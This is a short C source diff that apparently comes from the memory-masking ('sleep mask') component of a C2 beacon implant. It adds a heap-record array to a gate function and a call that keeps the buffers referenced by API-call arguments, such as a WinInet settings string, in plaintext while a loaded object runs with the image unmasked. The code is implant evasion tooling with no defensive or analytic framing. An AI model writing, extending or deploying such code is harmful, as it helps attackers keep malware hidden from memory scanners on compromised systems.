@@ -121,9 +121,12 @@ static BOOL sm410_load(void)
  * goes back to gate_dispatch, which runs it with the built-in
  * executors. The object runs from its own block with the image in the
  * clear; the info sits on this stack and is gone when it returns. */
+#define SM410_HEAP_COPY 256 /* heap records described to the object, at most */
+
 static BOOL sm410_gate(FUNCTION_CALL * fc)
 {
 	BEACON_INFO info;
+	HEAP_RECORD heap_copy[SM410_HEAP_COPY];
 
 	if (g_sm410_state != 1 || fc == NULL)
 		return FALSE;
@@ -134,6 +137,10 @@ static BOOL sm410_gate(FUNCTION_CALL * fc)
 	}
 	spawn_log("sm410: call api=", (long)fc->function);
 	beacon_info_fill(&info, g_sm410_obj.base, g_sm410_obj.text, g_sm410_obj.total);
+	/* what the call's arguments point into stays in the clear (a settings
+	 * string handed to WinInet) - the built-in engine's rule */
+	if (fc->bMask)
+		beacon_info_keep_plaintext(&info, fc->args, fc->numOfArgs, heap_copy, SM410_HEAP_COPY);
 	((void (*)(BEACON_INFO *, FUNCTION_CALL *))g_sm410_obj.entry)(&info, fc);
 	return TRUE;
 }
